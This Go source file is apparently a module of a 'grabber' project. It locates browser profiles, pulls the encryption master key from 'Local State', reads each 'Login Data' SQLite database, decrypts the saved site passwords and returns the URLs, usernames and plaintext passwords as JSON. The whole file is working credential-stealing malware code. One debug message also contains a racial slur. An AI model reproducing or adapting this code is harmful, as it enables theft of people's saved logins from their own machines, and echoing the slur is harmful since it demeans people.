package pass

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"kdot/grabber/browsers/util"
	"kdot/grabber/decryption"
)

type Passwords struct {
	OriginURL string `json:"origin_url"`
	Username  string `json:"username"`
	Password  string `json:"password"`
}

func Get() string {

	var passwords []Passwords
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		master_key := decryption.GetMasterKey(path + "\\Local State")
		ranOpera := false
		for _, profile := range extraPaths {
			if ranOpera {
				break
			} else if strings.Contains(path, "Opera") {
				profile = path
				ranOpera = true
				if _, err := os.Stat(path); os.IsNotExist(err) {
					continue
				}
			} else {
				if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
					continue
				}
				path = path + "\\" + profile
			}

			db, err := sql.Open("sqlite3", path+"\\Login Data")
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
			if err != nil {
				fmt.Println("this is the issue nigga")
				continue
			}
			defer row.Close()

			for row.Next() {
				var origin_url string
				var username_value string
				var password_value []byte
				row.Scan(&origin_url, &username_value, &password_value)
				decrypted, err := decryption.DecryptPassword(password_value, master_key)
				if err != nil {
					decrypted = string(password_value)
				}
				// I think this occurs when a user presses no to save password it still stores it (weird)
				if username_value == "" && decrypted == "" {
					continue
				}
				passwords = append(passwords, Passwords{origin_url, username_value, decrypted})
			}
		}
	}
	jsonData, err := json.MarshalIndent(passwords, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
